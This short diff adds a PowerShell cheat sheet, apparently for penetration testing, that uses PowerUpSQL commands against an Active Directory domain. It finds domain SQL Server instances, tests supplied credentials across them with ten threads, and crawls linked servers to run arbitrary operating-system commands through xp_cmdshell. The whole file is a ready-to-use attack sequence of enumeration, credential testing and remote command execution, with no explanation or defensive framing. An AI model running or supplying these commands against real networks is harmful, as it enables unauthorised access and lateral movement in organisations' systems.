@@ -1,0 +1,9 @@
+# discover active directory domain SQL server
+Get-SQLInstanceDomain -Verbose | Get-SQLServerinfo -Verbose
+
+# list accessible SQL server using credentials
+Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username <user> -password <password> | Where-Object {$_.Status -like "Accessible"}
+
+# execute commands
+Get-SQLServerLinkCrawl -Instance <computer> -Query "exec master..xp_cmdshell '<command>'"
+
